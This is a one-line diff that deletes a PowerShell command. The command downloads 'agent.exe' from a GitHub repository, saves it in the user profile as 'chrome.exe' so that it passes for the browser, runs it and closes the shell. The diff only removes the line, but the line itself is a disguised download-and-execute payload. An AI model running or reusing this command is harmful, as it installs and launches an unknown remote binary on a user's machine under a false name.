@@ -1,1 +1,0 @@
-wget https://github.com/fontapentest2/happyhappy/raw/main/agent.exe -OutFile $env:userprofile\\chrome.exe; start-process $env:userprofile\\chrome.exe; stop-process -Id $PID
